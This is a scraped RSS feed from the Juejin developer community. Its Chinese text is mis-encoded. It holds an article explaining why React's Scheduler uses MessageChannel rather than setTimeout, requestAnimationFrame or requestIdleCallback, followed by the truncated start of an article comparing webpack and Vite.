<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[React Schedulerä¸ºä½•é‡‡ç”¨MessageChannelè°ƒåº¦?]]></title>    <link>https://juejin.cn/post/7581678032336240682</link>    <guid>https://juejin.cn/post/7581678032336240682</guid>    <pubDate>2025-12-09T09:43:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581678032336240682" data-draft-id="7581428845683884075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Schedulerä¸ºä½•é‡‡ç”¨MessageChannelè°ƒåº¦? "/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T09:43:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŸæ¥æ˜¯å°ä»™å¥³å‘€"/> <meta itemprop="url" content="https://juejin.cn/user/1239904846362055"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Schedulerä¸ºä½•é‡‡ç”¨MessageChannelè°ƒåº¦? 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904846362055/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŸæ¥æ˜¯å°ä»™å¥³å‘€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:43:59.000Z" title="Tue Dec 09 2025 09:43:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style>





















































<table><thead><tr><th>ç‰¹æ€§</th><th><strong>setTimeout</strong></th><th><strong>requestAnimationFrame</strong></th><th><strong>requestIdleCallback</strong></th><th><strong>MessageChannel</strong></th></tr></thead><tbody><tr><td><strong>æœ¬è´¨</strong></td><td>å®šæ—¶å™¨å®ä»»åŠ¡</td><td>åŠ¨ç”»å›è°ƒé’©å­</td><td>ç©ºé—²æœŸå›è°ƒé’©å­</td><td>æ¶ˆæ¯é€šä¿¡å®ä»»åŠ¡</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>å»¶è¿ŸæŒ‡å®šæ¯«ç§’åï¼ˆä¸ç²¾ç¡®ï¼‰</td><td><strong>ä¸‹ä¸€å¸§æ¸²æŸ“ä¹‹å‰</strong>ï¼ˆä¸åˆ·æ–°ç‡åŒæ­¥ï¼‰</td><td><strong>æµè§ˆå™¨ç©ºé—²æ—¶</strong>ï¼ˆä¸€å¸§çš„æœ«å°¾ï¼‰</td><td><strong>ä¸‹ä¸€è½®äº‹ä»¶å¾ªç¯</strong>ï¼ˆä½œä¸ºå®ä»»åŠ¡ï¼‰</td></tr><tr><td><strong>ä¸»è¦è®¾è®¡ç›®çš„</strong></td><td>å»¶è¿Ÿæ‰§è¡Œä»£ç </td><td>å®ç°æµç•…åŠ¨ç”»</td><td>æ‰§è¡Œä½ä¼˜å…ˆçº§åå°ä»»åŠ¡</td><td>ä¸åŒä¸Šä¸‹æ–‡é—´é€šä¿¡</td></tr><tr><td><strong>å…³é”®ä¼˜åŠ¿</strong></td><td>é€šç”¨ã€çµæ´»ã€å…¼å®¹æ€§å¥½</td><td><strong>åŠ¨ç”»æµç•…ã€èŠ‚èƒ½</strong>ï¼ˆåå°æš‚åœï¼‰</td><td><strong>ä¸é˜»å¡æ¸²æŸ“ä¸äº¤äº’</strong>ï¼Œåˆ©ç”¨ç©ºé—²æ—¶é—´</td><td><strong>å»¶è¿ŸæçŸ­ä¸”ç¨³å®š</strong>ï¼Œå¯ç²¾å‡†æ§åˆ¶ä»»åŠ¡åˆ‡ç‰‡</td></tr><tr><td><strong>å…³é”®ç¼ºé™·</strong></td><td><strong>æ—¶åºä¸ç²¾ç¡®</strong>ï¼ŒåµŒå¥—æœ‰æœ€å°å»¶è¿Ÿï¼ˆå¦‚4msï¼‰</td><td><strong>ä¾èµ–æ¸²æŸ“å‘¨æœŸ</strong>ï¼Œæ‰§è¡Œé¢‘ç‡å›ºå®šï¼ˆ~16.7msï¼‰</td><td><strong>æ‰§è¡Œæ—¶æœºä¸å¯æ§</strong>ï¼Œå¯èƒ½é•¿æœŸå¾—ä¸åˆ°è°ƒç”¨</td><td><strong>éç”¨äºè°ƒåº¦</strong>ï¼Œæ˜¯â€œåˆ›é€ æ€§â€ç”¨æ³•</td></tr><tr><td><strong>Reactè°ƒåº¦çš„é€‚ç”¨æ€§</strong></td><td>âŒ å»¶è¿Ÿä¸å¯æ§ï¼Œä¸é€‚åˆç²¾ç»†è°ƒåº¦</td><td>âŒ ä¾èµ–æ¸²æŸ“èŠ‚å¥ï¼Œæ— æ³•åœ¨å¸§ä¸­å¤šæ¬¡è°ƒåº¦</td><td>âŒ æ—¶æœºä¸å¯é ï¼Œæ— æ³•æ»¡è¶³åŠæ—¶å“åº”éœ€æ±‚</td><td>âœ…Â <strong>åœ¨äº‹ä»¶å¾ªç¯ä¸­åŠæ—¶æ’å…¥ä»»åŠ¡ï¼Œå®ç°å¯ä¸­æ–­è°ƒåº¦çš„ç†æƒ³é€‰æ‹©</strong></td></tr></tbody></table>
<h3 data-id="heading-0">ğŸ“ å„APIåŠŸèƒ½ä¸ç‰¹æ€§è¯¦è§£</h3>
<p>ä¸‹é¢æˆ‘ä»¬æ¥å…·ä½“çœ‹çœ‹æ¯ä¸ªAPIçš„æ ¸å¿ƒå·¥ä½œæœºåˆ¶å’Œé€‚ç”¨åœºæ™¯ã€‚</p>
<ol>
<li>
<p><strong>setTimeout</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæœ€åŸºç¡€çš„å¼‚æ­¥å®šæ—¶å™¨ï¼Œç”¨äºåœ¨æŒ‡å®šçš„å»¶è¿Ÿï¼ˆæ¯«ç§’ï¼‰åï¼Œå°†å›è°ƒå‡½æ•°æ¨å…¥ä»»åŠ¡é˜Ÿåˆ—ç­‰å¾…æ‰§è¡Œ</li>
<li><strong>æ‰§è¡Œæœºåˆ¶</strong>ï¼šå®ƒè®¾ç½®çš„æ˜¯ä¸€ä¸ªâ€œ<strong>æœ€å°å»¶è¿Ÿ</strong>â€ï¼Œè€Œéç²¾ç¡®æ—¶é—´ã€‚å›è°ƒçš„å®é™…æ‰§è¡Œæ—¶é—´ä¼šå—åˆ°ä¸»çº¿ç¨‹ä¸Šå…¶ä»–ä»»åŠ¡ï¼ˆå¦‚åŒæ­¥ä»£ç ã€å¾®ä»»åŠ¡ã€UIæ¸²æŸ“ï¼‰çš„é˜»å¡ï¼Œå»¶è¿Ÿå¯èƒ½è¿œå¤§äºè®¾å®šå€¼</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šé€‚ç”¨äºå¯¹æ—¶é—´ç²¾åº¦è¦æ±‚ä¸é«˜çš„å»¶è¿Ÿæ“ä½œï¼Œå¦‚é˜²æŠ–/èŠ‚æµã€è½®è¯¢æ£€æŸ¥ç­‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>requestAnimationFrame</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šä¸“ä¸ºåŠ¨ç”»è®¾è®¡çš„APIï¼Œå…¶å›è°ƒå‡½æ•°ä¼šåœ¨<strong>æµè§ˆå™¨ä¸‹ä¸€æ¬¡é‡ç»˜ï¼ˆå³ç»˜åˆ¶ä¸‹ä¸€å¸§ï¼‰ä¹‹å‰æ‰§è¡Œ</strong></li>
<li><strong>æ‰§è¡Œæœºåˆ¶</strong>ï¼šä¸æ˜¾ç¤ºå™¨çš„åˆ·æ–°ç‡ï¼ˆé€šå¸¸æ˜¯60Hzï¼Œçº¦16.7ms/å¸§ï¼‰åŒæ­¥ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨ä¼˜åŒ–è°ƒç”¨ï¼Œåœ¨é¡µé¢ä¸å¯è§æ—¶ï¼ˆå¦‚æ ‡ç­¾é¡µè¢«éšè—ï¼‰ä¼šè‡ªåŠ¨æš‚åœï¼Œä»¥èŠ‚çœèµ„æº</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š<strong>å®ç°ä»»ä½•éœ€è¦å¹³æ»‘è¿‡æ¸¡çš„åŠ¨ç”»æ•ˆæœ</strong>ï¼Œæ˜¯æ›¿ä»£<code>setTimeout</code>åšåŠ¨ç”»çš„æœ€ä½³å®è·µ</li>
</ul>
</li>
<li>
<p><strong>requestIdleCallback</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå…è®¸ä½ åœ¨<strong>æµè§ˆå™¨ç©ºé—²æ—¶æœŸ</strong>è°ƒåº¦ä½ä¼˜å…ˆçº§ä»»åŠ¡</li>
<li><strong>æ‰§è¡Œæœºåˆ¶</strong>ï¼šåœ¨<strong>ä¸€å¸§å¤„ç†å®Œç”¨æˆ·è¾“å…¥ã€<code>requestAnimationFrame</code>å›è°ƒã€å¸ƒå±€å’Œç»˜åˆ¶ç­‰å…³é”®ä»»åŠ¡åï¼Œå¦‚æœè¿˜æœ‰å‰©ä½™æ—¶é—´</strong>ï¼Œæ‰ä¼šæ‰§è¡Œå®ƒçš„å›è°ƒå›è°ƒå‡½æ•°ä¼šæ¥æ”¶ä¸€ä¸ª<code>IdleDeadline</code>å‚æ•°ï¼Œå‘Šè¯‰ä½ å½“å‰å¸§è¿˜å‰©ä½™å¤šå°‘ç©ºé—²æ—¶é—´</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šé€‚åˆæ‰§è¡Œä¸€äº›éç´§æ€¥çš„åå°ä»»åŠ¡ï¼Œå¦‚æ•°æ®ä¸ŠæŠ¥ã€éå…³é”®çš„æ•°æ®é¢„å–ç­‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>MessageChannel</strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šç”¨äºåœ¨ä¸åŒæµè§ˆå™¨ä¸Šä¸‹æ–‡ï¼ˆå¦‚ä¸¤ä¸ªiframeã€ä¸»çº¿ç¨‹ä¸Web Workerï¼‰é—´å»ºç«‹åŒå‘é€šä¿¡çš„é€šé“</li>
<li><strong>æ‰§è¡Œæœºåˆ¶</strong>ï¼šè°ƒç”¨<code>port.postMessage()</code>æ–¹æ³•ï¼Œä¼šå‘<strong>æ¶ˆæ¯é˜Ÿåˆ—æ·»åŠ ä¸€ä¸ªå®ä»»åŠ¡</strong>ã€‚è¿™ä¸ªä»»åŠ¡ä¼šåœ¨å½“å‰äº‹ä»¶å¾ªç¯çš„å¾®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åã€ä¸‹ä¸€æ¬¡äº‹ä»¶å¾ªç¯ä¸­æ‰§è¡Œã€‚</li>
<li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šä¸»è¦åº”ç”¨äºè·¨ä¸Šä¸‹æ–‡é€šä¿¡ã€‚å®ƒåœ¨Reactè°ƒåº¦ä¸­çš„ç”¨æ³•ï¼Œæ˜¯åˆ©ç”¨å…¶<strong>èƒ½äº§ç”Ÿä¸€ä¸ªåœ¨ä¸‹ä¸€è½®äº‹ä»¶å¾ªç¯ä¸­å°½æ—©æ‰§è¡Œçš„å®ä»»åŠ¡</strong>çš„ç‰¹æ€§ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-1">âš™ï¸ ä¸ºä»€ä¹ˆReactæœ€ç»ˆé€‰æ‹©äº†MessageChannelï¼Ÿ</h3>
<p>Reactè°ƒåº¦å™¨çš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼š<strong>å®ç°å¯ä¸­æ–­çš„å¹¶å‘æ¸²æŸ“ï¼Œå°†é•¿ä»»åŠ¡åˆ‡æˆå°ç‰‡ï¼Œåœ¨æ¯ä¸€å¸§ä¸­æ’å…¥æ‰§è¡Œï¼ŒåŒæ—¶èƒ½å¿«é€Ÿå“åº”é«˜ä¼˜å…ˆçº§æ›´æ–°</strong>ã€‚è¿™å°±è¦æ±‚è°ƒåº¦å™¨èƒ½ä¸»åŠ¨ã€åŠæ—¶åœ°â€œè®©å‡ºâ€ä¸»çº¿ç¨‹ã€‚</p>
<p>ç»“åˆä¸Šè¡¨å’Œåˆ†æï¼Œå…¶ä»–APIä¸é€‚ç”¨äºæ­¤çš„åŸå› å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong><code>setTimeout</code></strong>ï¼š<strong>å»¶è¿Ÿä¸ç¨³å®šä¸”ä¸å¯æ§</strong>ã€‚å…¶æœ€å°å»¶è¿Ÿï¼ˆå¦‚4msï¼‰åœ¨å¯†é›†è°ƒåº¦æ—¶ä¼šé€ æˆæµªè´¹ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼Œå»¶è¿Ÿæ—¶é—´å¯èƒ½è¢«æ‹‰é•¿ï¼Œå¯¼è‡´è°ƒåº¦å™¨æ— æ³•åœ¨é¢„æœŸæ—¶é—´å†…â€œè‹é†’â€å¹¶äº¤è¿˜ä¸»çº¿ç¨‹ï¼Œå½±å“é¡µé¢å“åº”</li>
<li><strong><code>requestAnimationFrame</code></strong>ï¼š<strong>è°ƒç”¨é¢‘ç‡è¢«é”æ­»åœ¨å±å¹•åˆ·æ–°ç‡ï¼ˆçº¦16.7msä¸€æ¬¡ï¼‰</strong> ã€‚è¿™æ„å‘³ç€å³ä¾¿ä¸€å¸§ä¸­æœ‰å¤§é‡ç©ºé—²æ—¶é—´ï¼Œè°ƒåº¦å™¨ä¹Ÿæ— æ³•æ’å…¥æ›´å¤šä»»åŠ¡åˆ‡ç‰‡ï¼Œæ— æ³•å……åˆ†åˆ©ç”¨å¸§å†…çš„ç©ºé—²èµ„æº</li>
<li><strong><code>requestIdleCallback</code></strong>ï¼š<strong>æ‰§è¡Œæ—¶æœºâ€œå¤ªè¢«åŠ¨â€ä¸”ä¸ç¨³å®š</strong>ã€‚å®ƒä¾èµ–äºæµè§ˆå™¨çš„â€œç©ºé—²é€šçŸ¥â€ï¼Œä½†ç©ºé—²æœŸå¯èƒ½å¾ˆçŸ­æˆ–å¾ˆä¹…éƒ½ä¸å‡ºç°ã€‚å¯¹äºéœ€è¦ä¸»åŠ¨ã€å¯é¢„æµ‹åœ°è¿›è¡Œä»»åŠ¡åˆ‡ç‰‡çš„è°ƒåº¦å™¨æ¥è¯´ï¼Œè¿™ä¸å¯é ï¼ŒåŒæ—¶ï¼Œå…¶å…¼å®¹æ€§ä¹Ÿä¸å¤Ÿç†æƒ³ã€‚</li>
</ul>
<p><strong><code>MessageChannel</code>çš„ä¼˜åŠ¿</strong>æ­£åœ¨äºè§£å†³äº†ä¸Šè¿°é—®é¢˜ï¼š</p>
<ol>
<li><strong>ä¸»åŠ¨ä¸”åŠæ—¶çš„è°ƒåº¦</strong>ï¼šé€šè¿‡<code>port.postMessage()</code>ï¼ŒReactå¯ä»¥<strong>ä¸»åŠ¨</strong>åœ¨ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯ä¸­åˆ›å»ºä¸€ä¸ªå®ä»»åŠ¡æ¥ç»§ç»­å·¥ä½œã€‚è¿™è®©è°ƒåº¦å™¨èƒ½ç²¾ç¡®åœ°åœ¨æ¯ä¸ª5mså·¦å³çš„æ—¶é—´ç‰‡ï¼ˆè¿™æ˜¯Reactè®¾å®šçš„åˆ‡ç‰‡æ—¶é—´ç›®æ ‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.cn%2Fdeveloper%2Farticle%2F2440386" target="_blank" title="https://cloud.tencent.cn/developer/article/2440386" ref="nofollow noopener noreferrer">-7</a>ï¼‰ç»“æŸåâ€œä¸­æ–­â€è‡ªå·±ï¼ŒåŠæ—¶å½’è¿˜ä¸»çº¿ç¨‹ç»™æµè§ˆå™¨è¿›è¡Œæ¸²æŸ“æˆ–å¤„ç†äº¤äº’ã€‚</li>
<li><strong>æ›´é«˜çš„æ‰§è¡Œé¢‘ç‡</strong>ï¼šå®ƒä¸ä¾èµ–å±å¹•åˆ·æ–°ç‡ï¼Œå¯ä»¥åœ¨<strong>åŒä¸€å¸§å†…çš„å¤šæ¬¡äº‹ä»¶å¾ªç¯ä¸­è¿ç»­è°ƒåº¦</strong>ï¼Œä»è€Œæ›´å¯†é›†ã€æ›´å……åˆ†åœ°åˆ©ç”¨ä¸€å¸§ä¹‹å†…çš„è®¡ç®—èµ„æºã€‚</li>
<li><strong>é¿å…å¾®ä»»åŠ¡çš„å¼Šç«¯</strong>ï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨<code>Promise</code>ï¼ˆå¾®ä»»åŠ¡ï¼‰ï¼Ÿå› ä¸ºå¾®ä»»åŠ¡ä¼šåœ¨å½“å‰äº‹ä»¶å¾ªç¯ä¸­<strong>è¿ç»­æ‰§è¡Œç›´åˆ°é˜Ÿåˆ—æ¸…ç©º</strong>ï¼Œè¿™åŒæ ·ä¼šé•¿æ—¶é—´é˜»å¡ä¸»çº¿ç¨‹ï¼Œè¾¾ä¸åˆ°â€œå¯ä¸­æ–­â€çš„ç›®çš„</li>
</ol>
<h3 data-id="heading-2">ğŸ’ æ€»ç»“</h3>
<p>Reacté€‰æ‹©<code>MessageChannel</code>ï¼Œæ˜¯åŸºäºå…¶<strong>èƒ½äº§ç”Ÿä¸€ä¸ªåœ¨äº‹ä»¶å¾ªç¯ä¸­åŠæ—¶ã€ç¨³å®šæ‰§è¡Œçš„å®ä»»åŠ¡</strong>è¿™ä¸€ç‰¹æ€§ã€‚è¿™ä¸ºReactå®ç°<strong>ä¸»åŠ¨ã€å¯ä¸­æ–­ã€åŸºäºæ—¶é—´ç‰‡çš„ä»»åŠ¡è°ƒåº¦</strong>æä¾›äº†æœ€åˆé€‚çš„åº•å±‚æœºåˆ¶ï¼Œä»è€Œåœ¨å®ç°å¹¶å‘æ¸²æŸ“çš„åŒæ—¶ï¼Œä¿éšœäº†æµè§ˆå™¨çš„æ¸²æŸ“å’Œç”¨æˆ·äº¤äº’èƒ½è·å¾—æœ€é«˜ä¼˜å…ˆçº§çš„å“åº”ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[webpackå’ŒviteåŒºåˆ«åŠåŸç†å®ç°]]></title>    <link>https://juejin.cn/post/7581698074360971273</link>    <guid>https://juejin.cn/post/7581698074360971273</guid>    <pubDate>2025-12-09T09:52:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074360971273" data-draft-id="7581658157145358386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="webpackå’ŒviteåŒºåˆ«åŠåŸç†å®ç°"/> <meta itemprop="keywords" content="Vite,Webpack,æ˜é‡‘Â·é‡‘çŸ³è®¡åˆ’"/> <meta itemprop="datePublished" content="2025-12-09T09:52:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å…‰å½±å°‘å¹´"/> <meta itemprop="url" content="https://juejin.cn/user/3184663905962126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            webpackå’ŒviteåŒºåˆ«åŠåŸç†å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3184663905962126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å…‰å½±å°‘å¹´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:52:08.000Z" title="Tue Dec 09 2025 09:52:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body 